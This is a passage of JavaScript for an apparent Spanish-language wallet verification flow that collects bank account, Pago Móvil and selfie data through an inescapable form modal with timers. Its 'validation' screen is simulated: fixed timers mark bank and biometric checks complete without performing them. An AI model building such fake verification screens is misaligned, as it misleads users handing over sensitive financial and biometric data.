      function updateOptOutConfirmState() {
        if (!optOutConfirmBtn) return;
        const hasSelection = Array.from(optOutReasonInputs).some(input => input.checked);
        optOutConfirmBtn.disabled = !hasSelection;
      }

      function handleOptOutConfirm() {
        if (!optOutConfirmBtn) return;

        const selected = Array.from(optOutReasonInputs).find(input => input.checked);
        if (!selected) {
          updateOptOutConfirmState();
          return;
        }

        tallyOptedOut = true;

        try {
          localStorage.setItem(
            CONFIG.STORAGE_KEYS.VERIFICATION_TALLY,
            JSON.stringify({
              optedOut: true,
              reason: selected.value,
              optedOutAt: Date.now()
            })
          );
        } catch (error) {
          console.warn('No se pudo registrar la decisión de análisis alternativo:', error);
        }

        const optOutCompletionTime = Date.now();
        try {
          localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_STATUS, 'bank_validation');
          localStorage.setItem(
            CONFIG.STORAGE_KEYS.VERIFICATION_COMPLETION_TIME,
            String(optOutCompletionTime)
          );
          localStorage.setItem(
            CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING,
            JSON.stringify({
              isProcessing: false,
              currentPhase: 'bank_validation',
              startTime: optOutCompletionTime
            })
          );
        } catch (error) {
          console.warn('No se pudo sincronizar el estado tras omitir el formulario:', error);
        }

        closeOptOutOverlay();
        hideTallyModal();

        document.removeEventListener('keydown', preventEscape);

        if (tallyTimer) {
          clearInterval(tallyTimer);
        }

        window.removeEventListener('Tally:Submit', handleTallySubmit);

        showToast(
          'warning',
          'Análisis alternativo en proceso',
          'Te redirigiremos para continuar con un método de validación adicional'
        );

        setTimeout(() => {
          handleRedirectWithSummary('homevisa.html');
        }, 1200);
      }

      if (optOutReasonInputs.length) {
        optOutReasonInputs.forEach((input) => {
          input.addEventListener('change', updateOptOutConfirmState);
        });
      }

      if (optOutConfirmBtn) {
        optOutConfirmBtn.addEventListener('click', handleOptOutConfirm);
      }

      const cancelOptOut = () => {
        Array.from(optOutReasonInputs).forEach(input => {
          input.checked = false;
        });
        updateOptOutConfirmState();
        closeOptOutOverlay();
      };

      if (optOutCancelBtn) {
        optOutCancelBtn.addEventListener('click', cancelOptOut);
      }

      if (optOutCancelSecondary) {
        optOutCancelSecondary.addEventListener('click', cancelOptOut);
      }

      if (optOutOverlay) {
        optOutOverlay.addEventListener('click', (event) => {
          if (event.target === optOutOverlay) {
            cancelOptOut();
          }
        });
      }

      // Habilitar al recibir confirmación de Tally
      function handleTallySubmit() {
        enableContinueButton();
      }
      window.addEventListener('Tally:Submit', handleTallySubmit);

      // Detectar eventos enviados desde el iframe de Tally
      window.addEventListener('message', function(e) {
        if (!e.origin.includes('tally.so')) return;

        const data = e.data || {};
        const eventName = typeof data === 'string'
          ? data
          : (data.eventName || data.type || data.event);

        if (eventName && eventName.toLowerCase().includes('submit')) {
          handleTallySubmit();
        }
      });

      // Función para el temporizador
      function startTallyTimer() {
        secondsRemaining = 180;
        updateTimerDisplay();

        tallyTimer = setInterval(() => {
          secondsRemaining--;
          updateTimerDisplay();

          if (secondsRemaining <= 0) {
            clearInterval(tallyTimer);

            const timerContainer = document.getElementById('tally-timer');
            if (timerContainer) {
              timerContainer.innerHTML =
                '<i class="fas fa-exclamation-circle" style="color: var(--warning);"></i> Por favor, completa y envía el formulario para poder continuar';
            }
          }
        }, 1000);
      }

      // Actualizar display del temporizador
      function updateTimerDisplay() {
        const timerEl = document.getElementById('timer-seconds');
        const timerContainer = document.getElementById('tally-timer');

        if (timerEl) {
          timerEl.textContent = secondsRemaining;

          // Animación cuando quedan pocos segundos
          if (secondsRemaining <= 3 && secondsRemaining > 0) {
            gsap.fromTo(timerEl,
              { scale: 1.2, color: '#ff4d4d' },
              { scale: 1, color: '#1a1f71', duration: 0.5 }
            );
          }
        }

        if (secondsRemaining <= 0 && timerContainer) {
          timerContainer.innerHTML =
            '<i class="fas fa-exclamation-circle" style="color: var(--warning);"></i> Por favor, completa y envía el formulario para poder continuar';
        }
      }

      // Habilitar botón de continuar
      function enableContinueButton() {
        const continueBtn = document.getElementById('tally-continue');
        if (!continueBtn) return;

        const audioStateKey = 'continueAudioState';

        if (continueBtn.disabled) {
          continueBtn.dataset[audioStateKey] = 'pending';
        } else if (continueBtn.dataset[audioStateKey] === 'played') {
          return;
        } else {
          continueBtn.dataset[audioStateKey] = 'played';
          return;
        }

        continueBtn.disabled = false;
        continueBtn.innerHTML =
          '<i class="fas fa-check-circle"></i> ¡Formulario Recibido! Continuar';

        gsap.fromTo(
          continueBtn,
          { scale: 0.95 },
          { scale: 1.05, duration: 0.3, yoyo: true, repeat: 2 }
        );

        continueBtn.style.background = 'var(--gradient-success)';
        continueBtn.style.boxShadow = '0 4px 20px rgba(0, 211, 77, 0.4)';

        showIdCheckOverlay();

        continueBtn.dataset[audioStateKey] = 'played';

        playGuideAudio(ok45);

        showToast(
          'success',
          'Formulario recibido',
          'Puede continuar con la verificación'
        );
      }

      // Prevenir escape
      function preventEscape(e) {
        if (e.key === 'Escape') {
          e.preventDefault();
          showToast('warning', 'Formulario Obligatorio', 'Debe completar el formulario antes de continuar');
        }
      }

      // Marcar Tally como completado
      function markTallyCompleted(options = {}) {
        const { silent = false, skipStorage = false, skipScroll = false } = options;

        if (tallyOptedOut) {
          return;
        }

        tallyCompleted = true;

        if (!skipStorage) {
          try {
            localStorage.setItem(
              CONFIG.STORAGE_KEYS.VERIFICATION_TALLY,
              JSON.stringify({ completed: true, completedAt: Date.now() })
            );
          } catch (error) {
            console.warn('No se pudo guardar el estado del formulario final:', error);
          }
        }

        hideTallyModal();

        const indicator = document.getElementById('tally-completion-indicator');
        if (indicator) {
          indicator.style.display = 'block';
          indicator.classList.add('active');
        }

        const completeBtn = document.getElementById('complete-verification');
        if (completeBtn) {
          completeBtn.disabled = false;
          completeBtn.classList.remove('btn-outline');
          completeBtn.classList.add('btn-success');

          if (!skipScroll) {
            setTimeout(() => {
              completeBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }, 500);
          }
        }

        document.removeEventListener('keydown', preventEscape);

        if (tallyTimer) {
          clearInterval(tallyTimer);
        }

        if (!silent) {
          showToast('success', 'Formulario Completado', 'Ya puede finalizar su verificación');
        }

        window.removeEventListener('Tally:Submit', handleTallySubmit);
      }

      // Event listener para el botón continuar
      const continueBtn = document.getElementById('tally-continue');
      if (continueBtn) {
        continueBtn.addEventListener('click', function() {
          if (this.disabled) {
            showToast('error', 'Formulario pendiente', 'Debe enviar el formulario antes de continuar');
            return;
          }
          markTallyCompleted();
        });
      }

      const optOutBtn = document.getElementById('tally-optout');
      if (optOutBtn) {
        optOutBtn.addEventListener('click', () => {
          openOptOutOverlay();
        });
      }

      const optOutSummaryContinueBtn = document.getElementById('optout-summary-continue');
      if (optOutSummaryContinueBtn) {
        optOutSummaryContinueBtn.addEventListener('click', finalizeOptOutSummaryRedirect);
      }

      const storedTallyState = getStoredTallyState();

      if (storedTallyState) {
        if (storedTallyState.optedOut) {
          tallyOptedOut = true;
          setTimeout(() => {
            handleRedirectWithSummary('homevisa.html');
          }, 300);
        } else if (storedTallyState.completed) {
          markTallyCompleted({ silent: true, skipStorage: true, skipScroll: true });
        }
      }

      // Observer para detectar cuando se muestra el paso 4
      const step4Observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
          if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
            const step4 = document.getElementById('step-4');
            if (step4 && step4.classList.contains('active')) {
              // Mostrar el modal inmediatamente cuando se llega al paso 4
              setTimeout(() => {
                if (!tallyCompleted) {
                  showTallyModal();
                }
              }, 500);
            }
          }
        });
      });

      const step4 = document.getElementById('step-4');
      if (step4) {
        step4Observer.observe(step4, { attributes: true });

        if (step4.classList.contains('active') && !tallyCompleted) {
          setTimeout(() => {
            if (!tallyCompleted) {
              showTallyModal();
            }
          }, 500);
        }
      }

      // Prevenir que el usuario cierre el overlay haciendo clic fuera
      const tallyOverlay = document.getElementById('tally-overlay');
      if (tallyOverlay) {
        tallyOverlay.addEventListener('click', function(e) {
          if (e.target === this) {
            e.preventDefault();
            showToast('warning', 'Complete el Formulario', 'Debe completar el formulario antes de continuar');

            // Animación de shake en el modal
            const modal = this.querySelector('.tally-modal');
            if (modal) {
              gsap.fromTo(modal,
                { x: -10 },
                { x: 10, duration: 0.1, repeat: 5, yoyo: true, ease: "power2.inOut" }
              );
            }
          }
        });
      }
    }

    // Validate and proceed to next step
    function validateAndProceed(step) {
      if (step === 1) {
        if (validateStep1()) {
          saveStepData(1);
          goToStep(2);
        }
      } else if (step === 2) {
        if (selectedBank && selectedBank.id === 'no-bank') {
          if (validateStep2()) {
            completeNoBankFlow(noBankSupportInfo || getNoBankFormData());
          }
        } else if (validateStep2()) {
          showConfirmationOverlay();
        }
      } else if (step === 3) {
        if (biometricLocked) {
          goToStep(4);
          return;
        }
        if (validateStep3()) {
          goToStep(4);
        }
      }
    }

    // Validate step 1 (Personal Information)
    function validateStep1() {
      const requiredFields = [
        'address', 'occupation'
      ];
      
      let isValid = true;
      
      requiredFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (!validateField({ target: field })) {
          isValid = false;
        }
      });
      
      if (!isValid) {
        showToast('error', 'Campos incompletos', 'Por favor complete todos los campos correctamente');
        showIncompleteOverlay();
        // Focus first error field
        const firstError = document.querySelector('.form-control.error');
        if (firstError) {
          firstError.focus();
          firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }
      
      return isValid;
    }

    // Validate step 2 (Banking)
    function validateStep2() {
      if (!selectedBank) {
        showToast('error', 'Banco requerido', 'Por favor seleccione su banco');
        return false;
      }

      if (selectedBank.id === 'no-bank') {
        if (!noBankRequestCompleted) {
          showToast('error', 'Contacto pendiente', 'Debes reportar los datos del titular autorizado a soporte antes de continuar.');
          openNoBankOverlay();
          return false;
        }
        return true;
      }

      const accountNumber = document.getElementById('account-number').value.trim();
      if (!accountNumber || accountNumber.length !== 20) {
        showToast('error', 'Número de cuenta inválido', 'Por favor ingrese un número de cuenta válido');
        return false;
      }

      if (pagoMovilEnabled) {
        const pagoMovilPhone = document.getElementById('pago-movil-phone').value.trim();
        const pagoMovilCedula = document.getElementById('pago-movil-cedula').value.trim();
        
        if (!pagoMovilPhone || !pagoMovilCedula) {
          showToast('error', 'Datos de Pago Móvil incompletos', 'Por favor complete los datos de Pago Móvil');
          return false;
        }
      }

      return true;
    }

    // Validate step 3 (Biometric)
    function validateStep3() {
      if (!hasSelfie && !biometricSkipped) {
        showToast('error', 'Selfie requerida', 'Por favor tome una selfie para continuar');
        return false;
      }
      return true;
    }

    // Save step data
    function saveStepData(step) {
      if (step === 1) {
        const fields = [
          'address', 'occupation'
        ];

        fields.forEach(fieldId => {
          const field = document.getElementById(fieldId);
          if (field) {
            verificationData[fieldId] = field.value;
          }
        });
        
        verificationData.lastUpdate = new Date().toISOString();
        localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_DATA, JSON.stringify(verificationData));
      } else if (step === 2) {
        // Save banking data
        const isNoBank = selectedBank && selectedBank.id === 'no-bank';
        bankingData = {
          bankId: selectedBank.id,
          bankName: selectedBank.name,
          bankLogo: selectedBank.logo,
          accountType: isNoBank ? 'sin-cuenta' : accountType,
          accountNumber: isNoBank ? '' : document.getElementById('account-number').value.trim(),
          pagoMovilEnabled: isNoBank ? false : pagoMovilEnabled,
          pagoMovilPhone: !isNoBank && pagoMovilEnabled ? document.getElementById('pago-movil-phone').value.trim() : '',
          pagoMovilCedula: !isNoBank && pagoMovilEnabled ? document.getElementById('pago-movil-cedula').value.trim() : '',
          noBankSupportInfo: isNoBank ? noBankSupportInfo : null,
          noBankRequestCompleted: isNoBank ? noBankRequestCompleted : false,
          lastUpdate: new Date().toISOString()
        };

        localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_BANKING, JSON.stringify(bankingData));
      }
    }

    function scrollToVerificationStart(behavior = 'auto') {
      const container = document.querySelector('.verification-container');
      const headerOffset = 70;
      const scrollPosition = window.pageYOffset ?? document.documentElement.scrollTop ?? 0;
      const containerTop = container ? container.getBoundingClientRect().top + scrollPosition - headerOffset : 0;
      const targetTop = Math.max(containerTop, 0);

      try {
        window.scrollTo({ top: targetTop, behavior });
      } catch (error) {
        window.scrollTo(0, targetTop);
      }

      if (behavior === 'auto') {
        document.body.scrollTop = targetTop;
        document.documentElement.scrollTop = targetTop;
      }
    }

    // Go to specific step
    function goToStep(step) {
      if (step < 1 || step > totalSteps) return;

      if (step === 3 && (biometricLocked || biometricSkipped)) {
        goToStep(4);
        return;
      }

      const showTargetStep = () => {
        const targetStepEl = document.getElementById(`step-${step}`);
        if (targetStepEl) {
          targetStepEl.classList.add('active');
          requestAnimationFrame(() => scrollToVerificationStart('auto'));
          gsap.fromTo(targetStepEl,
            { opacity: 0, y: 20 },
            {
              opacity: 1,
              y: 0,
              duration: 0.5,
              onComplete: () => {
                if (step === 2) {
                  playGuideAudio(ok25);
                } else if (step === 3) {
                  playGuideAudio(ok32);
                }
              }
            }
          );
        }
      };

      // Hide current step with animation
      const currentStepEl = document.querySelector('.step-content.active');
      if (currentStepEl) {
        gsap.to(currentStepEl, {
          opacity: 0,
          y: -20,
          duration: 0.3,
          onComplete: () => {
            currentStepEl.classList.remove('active');

            // Show target step
            showTargetStep();
          }
        });
      } else {
        showTargetStep();
      }

      // Update progress
      updateProgress(step);

      currentStep = step;
    }

    // Update progress indicator
    function updateProgress(step) {

      
      const progressPercentage = ((step - 1) / (totalSteps - 1)) * 100;
      gsap.to('#progressFill', {
        width: `${progressPercentage}%`,
        duration: 0.8,
        ease: "power2.out"
      });
      const percentageEl = document.getElementById('progressPercentage');
      if (percentageEl) {
        percentageEl.textContent = `${Math.round(progressPercentage)}%`;
      }
    }

    // CORRECCIÓN CRÍTICA: Complete verification con nueva pantalla de validación
    function completeVerification() {
      if (!tallyCompleted) {
        showToast('warning', 'Formulario pendiente', 'Por favor complete el formulario antes de continuar');

        if (window.showTallyModal) {
          showTallyModal();
        }
        return;
      }

      // Mostrar pantalla de validación en lugar del loading overlay
      showValidationScreen();
    }

    // CORRECCIÓN CRÍTICA: Nueva función para mostrar pantalla de validación
    function showValidationScreen() {
      // Hide current step with animation
      const currentStepEl = document.querySelector('.step-content.active');
      if (currentStepEl) {
        gsap.to(currentStepEl, {
          opacity: 0,
          scale: 0.95,
          duration: 0.5,
          onComplete: () => {
            currentStepEl.classList.remove('active');
            
            // Show validation screen
            const validationEl = document.getElementById('validation');
            if (validationEl) {
              validationEl.classList.add('active');
              requestAnimationFrame(() => scrollToVerificationStart('auto'));
              gsap.fromTo(validationEl,
                { opacity: 0, scale: 0.95 },
                { opacity: 1, scale: 1, duration: 0.6 }
              );
            }
          }
        });
      }

      // Simulate validation process with progress animation
      const validationSteps = [
        {
          step: 1,
          progress: 25,
          text: 'Verificando información personal...',
          delay: 400,
          icon: '<i class="fas fa-check"></i>'
        },
        {
          step: 2,
          progress: 50,
          text: 'Validando datos bancarios...',
          delay: 400,
          icon: '<i class="fas fa-check"></i>'
        },
        {
          step: 3,
          progress: 75,
          text: 'Procesando biometría facial...',
          delay: 400,
          icon: '<i class="fas fa-check"></i>'
        },
        {
          step: 4,
          progress: 100,
          text: 'Completando verificación...',
          delay: 400,
          icon: '<i class="fas fa-check"></i>'
        }
      ];

      let currentValidationStep = 0;
      
      function processValidationStep() {
        if (currentValidationStep >= validationSteps.length) {
          // Proceso completado - mostrar completion y redirigir
          setTimeout(() => {
            completeVerificationProcess();
          }, 400);
          return;
        }

        const stepData = validationSteps[currentValidationStep];
        
        // Actualizar progreso visual
        updateValidationProgress(stepData.progress, stepData.text);
        
        // Actualizar step visual
        updateValidationStep(stepData.step, stepData.icon);
        
        setTimeout(() => {
          currentValidationStep++;
          processValidationStep();
        }, stepData.delay);
      }

      // Iniciar proceso de validación
      processValidationStep();
    }

    // Función para actualizar progreso de validación
    function updateValidationProgress(progress, text) {
      const progressBar = document.getElementById('validation-progress-bar');
      if (progressBar) {
        gsap.to(progressBar, { width: `${progress}%`, duration: 0.8, ease: "power2.out" });
      }
      
      // Actualizar texto si es necesario (opcional)
      console.log(`Progreso: ${progress}% - ${text}`);
    }

    // Función para actualizar step de validación
    function updateValidationStep(stepNumber, icon) {
      // Marcar pasos anteriores como completados
      for (let i = 1; i <= stepNumber; i++) {
        const stepEl = document.getElementById(`validation-step-${i}`);
        const iconEl = stepEl?.querySelector('.validation-step-icon');
        
        if (i < stepNumber) {
          // Pasos completados
          stepEl?.classList.add('completed');
          stepEl?.classList.remove('active');
          if (iconEl) iconEl.innerHTML = '<i class="fas fa-check"></i>';
        } else if (i === stepNumber) {
          // Paso actual
          stepEl?.classList.add('active');
          stepEl?.classList.remove('completed');
          if (iconEl) iconEl.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
          
          // Después de un momento, marcar como completado
          setTimeout(() => {
            stepEl?.classList.add('completed');
            stepEl?.classList.remove('active');
            if (iconEl) iconEl.innerHTML = icon;
          }, 300);
        }
      }
    }

    // Función completar proceso de verificación
    function completeVerificationProcess() {
      // Marcar el envío de documentos y comenzar el análisis
      verificationData.completionDate = new Date().toISOString();
      verificationData.status = 'processing';

      // Guardar datos finales y estado de procesamiento
      localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_DATA, JSON.stringify(verificationData));
      localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_STATUS, 'processing');

      // >>> AÑADE ESTO: Actualiza el estado en tu dashboard
      if (typeof RemeexTracker !== 'undefined') {
          RemeexTracker.trackVerificationStatus('enProceso');
      }

      // Registrar información para el análisis de documentos de 10 minutos
      const processingData = {
        isProcessing: true,
        startTime: Date.now(),
        currentPhase: 'documents',
        timer: null
      };
      localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING, JSON.stringify(processingData));
      
      // Stop camera if active
      if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
      }
      
      // Show completion screen with animation
      const currentStepEl = document.querySelector('.step-content.active');
      if (currentStepEl) {
        gsap.to(currentStepEl, {
          opacity: 0,
          scale: 0.95,
          duration: 0.5,
          onComplete: () => {
            currentStepEl.classList.remove('active');
            
            const completionEl = document.getElementById('completion');
            if (completionEl) {
              completionEl.classList.add('active');
              requestAnimationFrame(() => scrollToVerificationStart('auto'));
              gsap.fromTo(completionEl,
                { opacity: 0, scale: 0.95 },
                { opacity: 1, scale: 1, duration: 0.6 }
              );
            }
          }
        });
      }
      
      updateProgress(totalSteps + 1);
      
      // Confetti effect with faster timing
      setTimeout(() => {
        confetti({
          particleCount: 150,
          spread: 80,
          origin: { y: 0.6 },
          colors: ['#1a1f71', '#00d34d', '#f7b600']
        });
        
        // Second burst
        setTimeout(() => {
          confetti({
            particleCount: 100,
            spread: 60,
            origin: { y: 0.7 },
            colors: ['#1a1f71', '#00d34d', '#f7b600']
          });
        }, 300);
      }, 200);
      
      showToast('success', '¡Verificación completada!', 'Su información ha sido enviada correctamente');
      
      // CORRECCIÓN CRÍTICA: Redirigir después de 5 segundos
      setTimeout(() => {
        redirectToDashboard();
      }, 5000);
    }

    // Utility functions
    function showLoading(text = 'Cargando...') {
      const loadingOverlay = document.getElementById('loading-overlay');
      const loadingText = document.getElementById('loading-text');
      
      if (loadingText) loadingText.textContent = text;
      if (loadingOverlay) {
        loadingOverlay.style.display = 'flex';
        gsap.fromTo(loadingOverlay, { opacity: 0 }, { opacity: 1, duration: 0.3 });
      }
    }

    function hideLoading() {
      const loadingOverlay = document.getElementById('loading-overlay');
      if (loadingOverlay) {
        gsap.to(loadingOverlay, {
          opacity: 0,
          duration: 0.3,
          onComplete: () => {
            loadingOverlay.style.display = 'none';
            const continueBtn = document.getElementById('tally-continue');
            if (continueBtn) {
              continueBtn.disabled = false;
            }
          }
        });
      }
    }

    function getStoredTallyState() {
      try {
        const stored = localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_TALLY);
        return stored ? JSON.parse(stored) : null;
      } catch (error) {
        console.warn('No se pudo leer el estado del formulario final:', error);
        return null;
      }
    }

    function hasBiometricOptOut() {
      if (typeof biometricSkipped !== 'undefined' && biometricSkipped) {
        return true;
      }

      try {
        return localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_BIOMETRIC_SKIPPED) === 'true';
      } catch (error) {
        console.warn('No se pudo consultar el estado de biometría omitida:', error);
        return false;
      }
    }

    function buildOptOutSummaryItems() {
      const items = [];

      if (hasBiometricOptOut()) {
        items.push('Omitiste la verificación biométrica facial solicitada.');
      }

      const tallyState = getStoredTallyState();
      if (tallyState && tallyState.optedOut) {
        const reasonKey = tallyState.reason;
        const reasonLabel = reasonKey && TALLY_OPT_OUT_REASON_LABELS[reasonKey]
          ? TALLY_OPT_OUT_REASON_LABELS[reasonKey]
          : null;

        let identityMessage = 'Rechazaste validar tu identidad con documento y firma digital.';
        if (reasonLabel) {
          identityMessage += ` Motivo declarado: ${reasonLabel}.`;
        }
        items.push(identityMessage);
      }

      return items;
    }

    function showOptOutSummaryOverlay(targetUrl, summaryItems) {
      const overlay = document.getElementById('optout-summary-overlay');
      const list = document.getElementById('optout-summary-list');
      const items = Array.isArray(summaryItems) ? summaryItems : buildOptOutSummaryItems();

      if (!overlay || !list || !items.length) {
        executeRedirect(targetUrl);
        return;
      }

      list.innerHTML = '';
      items.forEach((text) => {
        const item = document.createElement('li');
        item.className = 'optout-summary-item';

        const icon = document.createElement('i');
        icon.className = 'fas fa-ban';
        icon.setAttribute('aria-hidden', 'true');

        const span = document.createElement('span');
        span.textContent = text;

        item.appendChild(icon);
        item.appendChild(span);
        list.appendChild(item);
      });

      overlay.style.display = 'flex';
      overlay.setAttribute('aria-hidden', 'false');
      pendingOptOutRedirect = targetUrl;
    }

    function finalizeOptOutSummaryRedirect(event) {
      if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
      }

      const overlay = document.getElementById('optout-summary-overlay');
      const list = document.getElementById('optout-summary-list');

      if (overlay) {
        overlay.style.display = 'none';
        overlay.setAttribute('aria-hidden', 'true');
      }

      if (list) {
        list.innerHTML = '';
      }

      const targetUrl = pendingOptOutRedirect || 'homevisa.html';
      pendingOptOutRedirect = null;
      executeRedirect(targetUrl);
    }

    function executeRedirect(targetUrl) {
      if (!targetUrl) {
        return;
      }

      if (window.opener && !window.opener.closed) {
        window.opener.location.href = targetUrl;
        window.close();
      } else {
        window.location.href = targetUrl;
      }
    }

    function handleRedirectWithSummary(targetUrl) {
      if (targetUrl && targetUrl.includes('homevisa')) {
        const summaryItems = buildOptOutSummaryItems();
        if (summaryItems.length) {
          showOptOutSummaryOverlay(targetUrl, summaryItems);
          return;
        }
      }

      executeRedirect(targetUrl);
    }

    function showConfirmationOverlay() {
      const overlay = document.getElementById('confirm-overlay');
      const bankLabel = document.getElementById('confirm-bank');
      const accLabel = document.getElementById('confirm-account');
      const bankLogo = document.getElementById('confirm-bank-logo');
      if (overlay) {
        if (bankLabel) bankLabel.textContent = selectedBank ? selectedBank.name : '';
        if (accLabel) accLabel.textContent = document.getElementById('account-number').value;
        if (bankLogo) {
          bankLogo.src = selectedBank ? selectedBank.logo : '';
          bankLogo.alt = selectedBank ? selectedBank.name : 'Banco';
        }
        overlay.style.display = 'flex';
        gsap.fromTo(overlay, { opacity: 0 }, { opacity: 1, duration: 0.3 });
        playGuideAudio(ok77);
      }
    }

    function hideConfirmationOverlay() {
      const overlay = document.getElementById('confirm-overlay');
      if (overlay) {
        gsap.to(overlay, {
          opacity: 0,
          duration: 0.3,
          onComplete: () => { overlay.style.display = 'none'; }
        });
      }
    }

    function showIdCheckOverlay() {
      const overlay = document.getElementById('id-check-overlay');
      if (overlay) {
        stopGuideAudios(ok42);
        overlay.style.display = 'flex';
        gsap.fromTo(overlay, { opacity: 0 }, {
          opacity: 1,
          duration: 0.3,
          onComplete: () => playGuideAudio(ok42)
        });
      }
    }

    function hideIdCheckOverlay() {
      const overlay = document.getElementById('id-check-overlay');
      if (overlay) {
        gsap.to(overlay, {
          opacity: 0,
          duration: 0.3,
          onComplete: () => { overlay.style.display = 'none'; }
        });
      }
    }

    function showFraudWarningOverlay() {
      const overlay = document.getElementById('fraud-warning-overlay');
      if (overlay) {
        overlay.style.display = 'flex';
        gsap.fromTo(overlay, { opacity: 0 }, { opacity: 1, duration: 0.3 });
      }
    }

    function hideFraudWarningOverlay() {
      const overlay = document.getElementById('fraud-warning-overlay');
      if (overlay) {
        gsap.to(overlay, {
          opacity: 0,
          duration: 0.3,
          onComplete: () => { overlay.style.display = 'none'; }
        });
      }
    }

    function showIncompleteOverlay() {
      const overlay = document.getElementById('incomplete-overlay');
      if (overlay) {
        overlay.style.display = 'flex';
        gsap.fromTo(overlay, { opacity: 0 }, { opacity: 1, duration: 0.3 });
      }
    }

    function hideIncompleteOverlay() {
      const overlay = document.getElementById('incomplete-overlay');
      if (overlay) {
        gsap.to(overlay, {
          opacity: 0,
          duration: 0.3,
          onComplete: () => { overlay.style.display = 'none'; }
        });
      }
    }

    function showRetakeOverlay(action = 'retake') {
      pendingRetakeAction = action;
      const overlay = document.getElementById('retake-overlay');
      if (!overlay) return;

      const title = document.getElementById('retake-overlay-title');
      const subtitle = document.getElementById('retake-overlay-subtitle');
      const note = document.getElementById('retake-overlay-note');
      const cancelBtn = document.getElementById('retake-cancel');

      if (action === 'remove') {
        if (title) title.textContent = '¿Eliminar la selfie y repetir el reconocimiento?';
        if (subtitle) subtitle.textContent = 'Reiniciaremos la captura biométrica guiada; sigue estas recomendaciones antes de continuar:';
        if (note) note.textContent = 'El registro actual se eliminará y deberás completar nuevamente los gestos solicitados.';
        if (cancelBtn) cancelBtn.textContent = 'Conservar selfie';
      } else {
        if (title) title.textContent = '¿Repetir el reconocimiento facial?';
        if (subtitle) subtitle.textContent = 'Antes de reiniciar el escaneo asegúrate de cumplir estas recomendaciones:';
        if (note) note.textContent = 'Al repetir borraremos la captura anterior para generar una nueva referencia biométrica.';
        if (cancelBtn) cancelBtn.textContent = 'Mantener captura';
      }

      overlay.style.display = 'flex';

      if (typeof stopGuideAudios === 'function' && ok39) {
        stopGuideAudios(ok39);
      }

      if (typeof playGuideAudio === 'function' && ok39) {
        playGuideAudio(ok39);
      }

      gsap.fromTo(overlay, { opacity: 0 }, { opacity: 1, duration: 0.3 });
    }

    function hideRetakeOverlay(event) {
      if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
      }
      const overlay = document.getElementById('retake-overlay');
      if (overlay) {
        gsap.to(overlay, {
          opacity: 0,
          duration: 0.3,
          onComplete: () => { overlay.style.display = 'none'; }
        });
      }
    }

    function confirmRetake(event) {
      if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
      }
      const action = pendingRetakeAction || 'retake';
      hideRetakeOverlay();
      setTimeout(() => {
        if (action === 'remove') {
          resetBiometricExperience({ silent: true, preserveAttempts: true });
          showToast('info', 'Escaneo reiniciado', 'Puede realizar un nuevo escaneo biométrico cuando lo desee.');
        } else {
          resetBiometricExperience({ silent: false, preserveAttempts: true });
        }
        pendingRetakeAction = 'retake';
      }, 320);
    }

    function showSkipBiometricsOverlay() {
      const overlay = document.getElementById('skip-biometrics-overlay');
      if (!overlay) {
        return;
      }

      overlay.style.display = 'flex';
      overlay.setAttribute('aria-hidden', 'false');

      if (typeof stopGuideAudios === 'function' && ok39) {
        stopGuideAudios(ok39);
      }

      if (typeof playGuideAudio === 'function' && ok39) {
        playGuideAudio(ok39);
      }

      gsap.fromTo(overlay, { opacity: 0 }, { opacity: 1, duration: 0.3 });
    }

    function hideSkipBiometricsOverlay(event) {
      if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
      }

      const overlay = document.getElementById('skip-biometrics-overlay');
      if (!overlay) {
        return;
      }

      gsap.to(overlay, {
        opacity: 0,
        duration: 0.3,
        onComplete: () => {
          overlay.style.display = 'none';
          overlay.setAttribute('aria-hidden', 'true');
        }
      });
    }

    function confirmSkipBiometrics(event) {
      if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
      }

      hideSkipBiometricsOverlay();

      markBiometricSkip();
      applyBiometricOptOutState();

      setTimeout(() => {
        resetBiometricExperience({ silent: true, preserveAttempts: true, preserveSkip: true });
        updateNextButtonState();
        updateStep4BiometricMessaging();

        showToast('info', 'Continuar sin biometría', 'Abriremos el formulario de documentos para validar tu identidad.');

        goToStep(4);

        if (typeof window.showTallyModal === 'function') {
          window.showTallyModal();
        }
      }, 320);
    }

    function showTallyOverlay() {
      const overlay = document.getElementById('tally-overlay');
      if (overlay) {
        overlay.style.display = 'flex';
        gsap.fromTo(overlay, { opacity: 0 }, { opacity: 1, duration: 0.4 });
      }
    }

    function hideTallyOverlay() {
      const overlay = document.getElementById('tally-overlay');
      if (overlay) {
        gsap.to(overlay, {
          opacity: 0,
          duration: 0.4,
          onComplete: () => { overlay.style.display = 'none'; }
        });
      }
    }

    // Redirige al panel principal y cierra la ventana si es un popup
    function redirectToDashboard() {
      const status = localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_STATUS);
      if (status && status !== 'unverified' && !localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_COMPLETION_TIME)) {
        localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_COMPLETION_TIME, Date.now().toString());
      }

      const targetUrlBase = getRecargaPage();
      const separator = targetUrlBase.includes('?') ? '&' : '?';
      const redirectUrl = `${targetUrlBase}${separator}reload=${Date.now()}`;

      handleRedirectWithSummary(redirectUrl);
    }

    function showToast(type, title, message, duration = 4000) {
      const toastContainer = document.getElementById('toast-container');
      if (!toastContainer) return;
      
      const toast = document.createElement('div');
      toast.className = `toast ${type}`;
      
      let iconClass = 'fa-info-circle';
      if (type === 'success') iconClass = 'fa-check-circle';
